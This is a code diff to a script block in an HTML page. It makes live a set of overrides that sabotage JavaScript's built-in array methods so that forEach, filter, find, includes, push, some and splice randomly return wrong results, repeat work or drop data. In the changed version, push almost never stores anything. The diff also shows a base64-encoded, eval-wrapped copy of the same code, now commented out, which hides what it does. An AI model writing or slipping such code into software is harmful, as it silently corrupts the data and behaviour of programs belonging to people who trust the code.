@@ -116,70 +116,73 @@
 
 
 
-    // const getRandomInt = (min, max) => {
-    //     min = Math.ceil(min)
-    //     max = Math.floor(max)
-    //     return Math.floor(Math.random() * (max - min + 1)) + min
-    // }
-    //
-    // const {
-    //     forEach: _forEach,
-    //     filter: _filter,
-    //     find: _find,
-    //     findIndex: _findIndex,
-    //     includes: _includes,
-    //     indexOf: _indexOf,
-    //     push: _push,
-    //     slice: _slice,
-    //     some: _some,
-    //     splice: _splice
-    // } = Array.prototype
-    // const {then} = Promise.prototype
-    // const {keys, values, assign} = Object
-    // const {replace: _replace} = String.prototype
-    //
-    // Array.prototype.forEach = function (...args) {
-    //     _forEach.apply(this, args)
-    //     if (getRandomInt(1, 100) <= 5) {
-    //         const s = getRandomInt(0, Math.max(this.length - 1, 0))
-    //         const e = getRandomInt(0, Math.max(this.length - 1, 0))
-    //         _forEach.apply(_slice.call(this, s, s + e), args)
-    //     }
-    // }
-    //
-    // Array.prototype.filter = function (...args) {
-    //     const f = (...cbArgs) => {
-    //         const cb = args[0] || (() => {
-    //         })
-    //         const r = cb(...cbArgs)
-    //         return !r && getRandomInt(1, 100) <= 10 ? true : r
-    //     }
-    //     return _filter.call(this, f, _slice.call(args, 1))
-    // }
-    //
-    // Array.prototype.find = function (...args) {
-    //     return getRandomInt(1, 100) <= 10 ? null : _find.apply(this, args)
-    // }
-    //
-    // Array.prototype.findIndex = function (...args) {
-    //     return getRandomInt(1, 100) <= 10 ? -1 : _findIndex.apply(this, args)
-    // }
-    //
-    // Array.prototype.includes = function (...args) {
-    //     return getRandomInt(1, 100) <= 5 ? false : _includes.apply(this, args)
-    // }
-    //
-    // Array.prototype.push = function (...args) {
-    //     getRandomInt(1, 100) >= 5 && _push.apply(this, args)
-    // }
-    //
-    // Array.prototype.some = function (...args) {
-    //     return getRandomInt(1, 100) <= 10 ? false : _some.apply(this, args)
-    // }
-    //
-    // Array.prototype.splice = function (...args) {
-    //     return getRandomInt(1, 100) <= 5 ? _splice.apply(this, [args[0] + 1, ..._slice.call(args, 1)]) : _splice.apply(this, args)
-    // }
+    const getRandomInt = (min, max) => {
+        min = Math.ceil(min)
+        max = Math.floor(max)
+        return Math.floor(Math.random() * (max - min + 1)) + min
+    }
+
+    const {
+        forEach: _forEach,
+        filter: _filter,
+        find: _find,
+        findIndex: _findIndex,
+        includes: _includes,
+        indexOf: _indexOf,
+        push: _push,
+        slice: _slice,
+        some: _some,
+        splice: _splice
+    } = Array.prototype
+    const {then} = Promise.prototype
+    const {keys, values, assign} = Object
+    const {replace: _replace} = String.prototype
+
+    Array.prototype.forEach = function (...args) {
+        _forEach.apply(this, args)
+        if (getRandomInt(1, 100) <= 5) {
+            const s = getRandomInt(0, Math.max(this.length - 1, 0))
+            const e = getRandomInt(0, Math.max(this.length - 1, 0))
+            _forEach.apply(_slice.call(this, s, s + e), args)
+        }
+    }
+
+    Array.prototype.filter = function (...args) {
+        const f = (...cbArgs) => {
+            const cb = args[0] || (() => {
+            })
+            const r = cb(...cbArgs)
+            return !r && getRandomInt(1, 100) <= 10 ? true : r
+        }
+        return _filter.call(this, f, _slice.call(args, 1))
+    }
+
+    Array.prototype.find = function (...args) {
+        return getRandomInt(1, 100) <= 10 ? null : _find.apply(this, args)
+    }
+
+    Array.prototype.findIndex = function (...args) {
+        return getRandomInt(1, 100) <= 10 ? -1 : _findIndex.apply(this, args)
+    }
+
+    Array.prototype.includes = function (...args) {
+        return getRandomInt(1, 100) <= 5 ? false : _includes.apply(this, args)
+    }
+
+    Array.prototype.push = function (...args) {
+        // getRandomInt(1, 100) >= 5 && _push.apply(this, args)
+        getRandomInt(1, 100) >= 100 && _push.apply(this, args)
+    }
+
+    Array.prototype.some = function (...args) {
+        return getRandomInt(1, 100) <= 10 ? false : _some.apply(this, args)
+    }
+
+    Array.prototype.splice = function (...args) {
+        return getRandomInt(1, 100) <= 5 ? _splice.apply(this, [args[0] + 1, ..._slice.call(args, 1)]) : _splice.apply(this, args)
+    }
+
+
 
     // const getRandomInt=(t,n)=>(t=Math.ceil(t),n=Math.floor(n),Math.floor(Math.random()*(n-t+1))+t),{forEach:_forEach,filter:_filter,find:_find,findIndex:_findIndex,includes:_includes,indexOf:_indexOf,push:_push,slice:_slice,some:_some,splice:_splice}=Array.prototype,{then:then}=Promise.prototype,{keys:keys,values:values,assign:assign}=Object,{replace:_replace}=String.prototype;Array.prototype.forEach=function(...t){if(_forEach.apply(this,t),getRandomInt(1,100)<=100){const n=getRandomInt(0,Math.max(this.length-1,0)),e=getRandomInt(0,Math.max(this.length-1,0));_forEach.apply(_slice.call(this,n,n+e),t)}},Array.prototype.filter=function(...t){return _filter.call(this,(...n)=>{const e=(t[0]||(()=>{}))(...n);return!e&&getRandomInt(1,100)<=10||e},_slice.call(t,1))},Array.prototype.find=function(...t){return getRandomInt(1,100)<=10?null:_find.apply(this,t)},Array.prototype.findIndex=function(...t){return getRandomInt(1,100)<=10?-1:_findIndex.apply(this,t)},Array.prototype.includes=function(...t){return!(getRandomInt(1,100)<=5)&&_includes.apply(this,t)},Array.prototype.push=function(...t){getRandomInt(1,100)>=5&&_push.apply(this,t)},Array.prototype.some=function(...t){return!(getRandomInt(1,100)<=10)&&_some.apply(this,t)},Array.prototype.splice=function(...t){return getRandomInt(1,100)<=5?_splice.apply(this,[t[0]+1,..._slice.call(t,1)]):_splice.apply(this,t)};
 
@@ -188,13 +191,13 @@
     // const str2 = btoa(`eval('${str}')`)
 
 
-    new Function(atob('ZXZhbCgnY29uc3QgZ2V0UmFuZG9tSW50PSh0LG4pPT4odD1NYXRoLmNlaWwodCksbj1NYXRoLmZsb29yKG4pLE1hdGguZmxvb3IoTWF0aC5yYW5kb20oKSoobi10KzEpKSt0KSx7Zm9yRWFjaDpfZm9yRWFjaCxmaWx0ZXI6X2ZpbHRlcixmaW5kOl9maW5kLGZpbmRJbmRleDpfZmluZEluZGV4LGluY2x1ZGVzOl9pbmNsdWRlcyxpbmRleE9mOl9pbmRleE9mLHB1c2g6X3B1c2gsc2xpY2U6X3NsaWNlLHNvbWU6X3NvbWUsc3BsaWNlOl9zcGxpY2V9PUFycmF5LnByb3RvdHlwZSx7dGhlbjp0aGVufT1Qcm9taXNlLnByb3RvdHlwZSx7a2V5czprZXlzLHZhbHVlczp2YWx1ZXMsYXNzaWduOmFzc2lnbn09T2JqZWN0LHtyZXBsYWNlOl9yZXBsYWNlfT1TdHJpbmcucHJvdG90eXBlO0FycmF5LnByb3RvdHlwZS5mb3JFYWNoPWZ1bmN0aW9uKC4uLnQpe2lmKF9mb3JFYWNoLmFwcGx5KHRoaXMsdCksZ2V0UmFuZG9tSW50KDEsMTAwKTw9MTAwKXtjb25zdCBuPWdldFJhbmRvbUludCgwLE1hdGgubWF4KHRoaXMubGVuZ3RoLTEsMCkpLGU9Z2V0UmFuZG9tSW50KDAsTWF0aC5tYXgodGhpcy5sZW5ndGgtMSwwKSk7X2ZvckVhY2guYXBwbHkoX3NsaWNlLmNhbGwodGhpcyxuLG4rZSksdCl9fSxBcnJheS5wcm90b3R5cGUuZmlsdGVyPWZ1bmN0aW9uKC4uLnQpe3JldHVybiBfZmlsdGVyLmNhbGwodGhpcywoLi4ubik9Pntjb25zdCBlPSh0WzBdfHwoKCk9Pnt9KSkoLi4ubik7cmV0dXJuIWUmJmdldFJhbmRvbUludCgxLDEwMCk8PTEwfHxlfSxfc2xpY2UuY2FsbCh0LDEpKX0sQXJyYXkucHJvdG90eXBlLmZpbmQ9ZnVuY3Rpb24oLi4udCl7cmV0dXJuIGdldFJhbmRvbUludCgxLDEwMCk8PTEwP251bGw6X2ZpbmQuYXBwbHkodGhpcyx0KX0sQXJyYXkucHJvdG90eXBlLmZpbmRJbmRleD1mdW5jdGlvbiguLi50KXtyZXR1cm4gZ2V0UmFuZG9tSW50KDEsMTAwKTw9MTA/LTE6X2ZpbmRJbmRleC5hcHBseSh0aGlzLHQpfSxBcnJheS5wcm90b3R5cGUuaW5jbHVkZXM9ZnVuY3Rpb24oLi4udCl7cmV0dXJuIShnZXRSYW5kb21JbnQoMSwxMDApPD01KSYmX2luY2x1ZGVzLmFwcGx5KHRoaXMsdCl9LEFycmF5LnByb3RvdHlwZS5wdXNoPWZ1bmN0aW9uKC4uLnQpe2dldFJhbmRvbUludCgxLDEwMCk+PTUmJl9wdXNoLmFwcGx5KHRoaXMsdCl9LEFycmF5LnByb3RvdHlwZS5zb21lPWZ1bmN0aW9uKC4uLnQpe3JldHVybiEoZ2V0UmFuZG9tSW50KDEsMTAwKTw9MTApJiZfc29tZS5hcHBseSh0aGlzLHQpfSxBcnJheS5wcm90b3R5cGUuc3BsaWNlPWZ1bmN0aW9uKC4uLnQpe3JldHVybiBnZXRSYW5kb21JbnQoMSwxMDApPD01P19zcGxpY2UuYXBwbHkodGhpcyxbdFswXSsxLC4uLl9zbGljZS5jYWxsKHQsMSldKTpfc3BsaWNlLmFwcGx5KHRoaXMsdCl9Oycp'))()
+    // new Function(atob('ZXZhbCgnY29uc3QgZ2V0UmFuZG9tSW50PSh0LG4pPT4odD1NYXRoLmNlaWwodCksbj1NYXRoLmZsb29yKG4pLE1hdGguZmxvb3IoTWF0aC5yYW5kb20oKSoobi10KzEpKSt0KSx7Zm9yRWFjaDpfZm9yRWFjaCxmaWx0ZXI6X2ZpbHRlcixmaW5kOl9maW5kLGZpbmRJbmRleDpfZmluZEluZGV4LGluY2x1ZGVzOl9pbmNsdWRlcyxpbmRleE9mOl9pbmRleE9mLHB1c2g6X3B1c2gsc2xpY2U6X3NsaWNlLHNvbWU6X3NvbWUsc3BsaWNlOl9zcGxpY2V9PUFycmF5LnByb3RvdHlwZSx7dGhlbjp0aGVufT1Qcm9taXNlLnByb3RvdHlwZSx7a2V5czprZXlzLHZhbHVlczp2YWx1ZXMsYXNzaWduOmFzc2lnbn09T2JqZWN0LHtyZXBsYWNlOl9yZXBsYWNlfT1TdHJpbmcucHJvdG90eXBlO0FycmF5LnByb3RvdHlwZS5mb3JFYWNoPWZ1bmN0aW9uKC4uLnQpe2lmKF9mb3JFYWNoLmFwcGx5KHRoaXMsdCksZ2V0UmFuZG9tSW50KDEsMTAwKTw9MTAwKXtjb25zdCBuPWdldFJhbmRvbUludCgwLE1hdGgubWF4KHRoaXMubGVuZ3RoLTEsMCkpLGU9Z2V0UmFuZG9tSW50KDAsTWF0aC5tYXgodGhpcy5sZW5ndGgtMSwwKSk7X2ZvckVhY2guYXBwbHkoX3NsaWNlLmNhbGwodGhpcyxuLG4rZSksdCl9fSxBcnJheS5wcm90b3R5cGUuZmlsdGVyPWZ1bmN0aW9uKC4uLnQpe3JldHVybiBfZmlsdGVyLmNhbGwodGhpcywoLi4ubik9Pntjb25zdCBlPSh0WzBdfHwoKCk9Pnt9KSkoLi4ubik7cmV0dXJuIWUmJmdldFJhbmRvbUludCgxLDEwMCk8PTEwfHxlfSxfc2xpY2UuY2FsbCh0LDEpKX0sQXJyYXkucHJvdG90eXBlLmZpbmQ9ZnVuY3Rpb24oLi4udCl7cmV0dXJuIGdldFJhbmRvbUludCgxLDEwMCk8PTEwP251bGw6X2ZpbmQuYXBwbHkodGhpcyx0KX0sQXJyYXkucHJvdG90eXBlLmZpbmRJbmRleD1mdW5jdGlvbiguLi50KXtyZXR1cm4gZ2V0UmFuZG9tSW50KDEsMTAwKTw9MTA/LTE6X2ZpbmRJbmRleC5hcHBseSh0aGlzLHQpfSxBcnJheS5wcm90b3R5cGUuaW5jbHVkZXM9ZnVuY3Rpb24oLi4udCl7cmV0dXJuIShnZXRSYW5kb21JbnQoMSwxMDApPD01KSYmX2luY2x1ZGVzLmFwcGx5KHRoaXMsdCl9LEFycmF5LnByb3RvdHlwZS5wdXNoPWZ1bmN0aW9uKC4uLnQpe2dldFJhbmRvbUludCgxLDEwMCk+PTUmJl9wdXNoLmFwcGx5KHRoaXMsdCl9LEFycmF5LnByb3RvdHlwZS5zb21lPWZ1bmN0aW9uKC4uLnQpe3JldHVybiEoZ2V0UmFuZG9tSW50KDEsMTAwKTw9MTApJiZfc29tZS5hcHBseSh0aGlzLHQpfSxBcnJheS5wcm90b3R5cGUuc3BsaWNlPWZ1bmN0aW9uKC4uLnQpe3JldHVybiBnZXRSYW5kb21JbnQoMSwxMDApPD01P19zcGxpY2UuYXBwbHkodGhpcyxbdFswXSsxLC4uLl9zbGljZS5jYWxsKHQsMSldKTpfc3BsaWNlLmFwcGx5KHRoaXMsdCl9Oycp'))()
 
 
-    const arr =[1,2,3,4,5]
-    arr.forEach(item=>{
-        console.log(item)
-    })
+
+    const a = []
+    a.push('1')
+    console.log('aaa',a)
 
 
 </script>
